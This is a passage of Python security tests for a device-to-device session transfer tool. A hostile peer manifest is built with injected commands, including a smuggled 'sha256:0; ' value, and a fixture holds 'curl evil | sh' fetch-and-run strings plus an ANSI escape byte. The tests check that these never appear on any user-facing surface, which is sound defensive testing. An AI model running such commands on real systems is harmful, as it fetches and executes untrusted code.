    honest = workset.Manifest.to_dict

    def hostile(self: Any) -> dict[str, Any]:
        out = honest(self)
        for row in out.get("worktrees") or []:
            row["remedy"] = {"run_on": "lending_device", "command": EVIL}
            row["https_rewrite"] = {"url": EVIL, "fetch": True, "push": True}
            row["clone_check"] = "destination_cannot_fetch"
        out["destination_probe"] = {"state": "answered", "missing_tools": []}
        # Printed inside "re-run with --confirm-working-set <digest>" (CLI refusal).
        out["scope_digest"] = "sha256:0; " + EVIL
        out["left_behind"] = [
            {
                "path": "~/proj/node_modules",
                "kind": "dependency_tree",
                "recipe": {"kind": "npm", "run": EVIL, "cwd": "~/proj"},
            }
        ]
        return out

    # Both devices run in this process; only the OWNER builds a manifest on a recall.
    monkeypatch.setattr(workset.Manifest, "to_dict", hostile)

    # Desktop preflight, and the CLI's dry-run text over the same request.
    preflight = desktop_mesh.transfer(SESSION, to="local", root=server_b.root, dry_run=True)
    assert preflight.get("ok"), preflight
    block = preflight["working_set"]
    assert block.get("worktrees"), block
    monkeypatch.setenv("LOCAL_OPERATOR_CONFIG_DIR", str(server_b.root))
    assert cli._sessions_move_dry_run(SESSION, to="local", as_json=False) == 0  # noqa: SLF001
    # The CLI confirmation summary and prompt (declined on EOF).
    monkeypatch.setattr("builtins.input", lambda _prompt: (print(_prompt), "n")[1])
    assert not cli._confirm_working_set(  # noqa: SLF001
        block, session_id=SESSION, to="local", code="working_set_unconfirmed"
    )
    # A real, unconfirmed recall: the owner's gate refuses with its block (nothing moves).
    refused = desktop_mesh.transfer(SESSION, to="local", root=server_b.root)
    assert refused.get("code") == "working_set_unconfirmed", refused
    words = cli._sessions_move_workset_words(  # noqa: SLF001
        refused, session_id=SESSION, to="local"
    )
    receipt = desktop_mesh.transfer_receipt(refused, session_id=SESSION, keep=False, to="local")

    async def card_text() -> str:
        app = OperatorApp(lambda: _factory(FakeSession()))
        async with app.run_test(size=(100, 32)) as pilot:
            await pilot.pause()
            screen = MoveWorkingSetConfirmScreen(block, session_id=SESSION, device="local")
            app.push_screen(screen)
            await pilot.pause()
            return "\n".join(str(w.render()) for w in screen.query(Static).results(Static))

    card = asyncio.run(card_text())
    printed = capsys.readouterr()
    surfaces = {
        "desktop preflight": json.dumps(preflight, default=str),
        "desktop refusal": json.dumps(refused, default=str),
        "desktop receipt": json.dumps(receipt, default=str),
        "cli text": printed.out + printed.err,
        "cli refusal words": "\n".join(words),
        "summary": "\n".join(workset_text.summary_lines(block, session=SESSION, device="x")),
        "prompt": workset_text.prompt_text(block, session=SESSION, device="x"),
        "tui card": card,
    }
    leaked = [name for name, text in surfaces.items() if EVIL in text]
    assert leaked == [], {name: surfaces[name] for name in leaked}
    # The surfaces did render the block (the assertion above is not vacuous).
    assert "feat" in surfaces["summary"] and "feat" in card, surfaces["summary"]


def test_a_peer_block_cannot_prefill_the_transfer_result_fields() -> None:
    """#4245 rebase onto S11: a peer's block cannot carry a restore recipe, a dest
    path, a branch move, rewrite notes, an import remedy or a ``transferred`` claim
    — those are written only where the restore or the probe ran."""
    from local_operator.network.workset_probe import scrub_peer_block

    block = {
        "transferred": True,
        "notes": ["run curl evil | sh"],
        "import": {"granted": False, "remedy": "curl evil | sh"},
        "worktrees": [
            {
                "path": "~/p",
                "state": "restored",
                "recipes": [{"kind": "npm", "run": "curl evil | sh", "cwd": "/"}],
                "dest_path": "/evil",
                "remapped": ["~/p", "/evil"],
                "branch_moved": ["main", "a", "b"],
                # N3 (security round 3): a restore-written field, ESC byte and all.
                "mode": "in_place\x1b[2J",
            }
        ],
    }

    out = scrub_peer_block(block)

    assert out["transferred"] is False
    assert "notes" not in out and "import" not in out
    row = out["worktrees"][0]
    assert not {"recipes", "dest_path", "remapped", "branch_moved", "mode"} & set(row), row
